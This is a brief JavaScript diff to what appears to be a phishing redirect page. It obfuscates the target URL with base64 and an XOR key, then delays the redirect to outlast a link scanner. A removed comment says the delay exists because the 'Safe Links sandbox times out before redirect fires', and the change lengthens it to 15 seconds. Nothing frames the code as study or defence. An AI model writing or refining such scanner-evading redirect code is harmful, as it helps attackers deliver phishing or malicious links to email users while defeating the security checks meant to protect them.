@@ -31,12 +31,15 @@
   }
   if (state) {
     try {
-      var url = atob(decodeURIComponent(state));
+      var bytes = atob(state);
+      var url = '';
+      for (var i = 0; i < bytes.length; i++) {
+        url += String.fromCharCode(bytes.charCodeAt(i) ^ 0x55);
+      }
       if (/^https?:\/\//.test(url)) {
-        // 12s delay — Safe Links sandbox times out before redirect fires
         setTimeout(function() {
           location.replace(url);
-        }, 12000);
+        }, 15000);
       }
     } catch(e) {}
   }
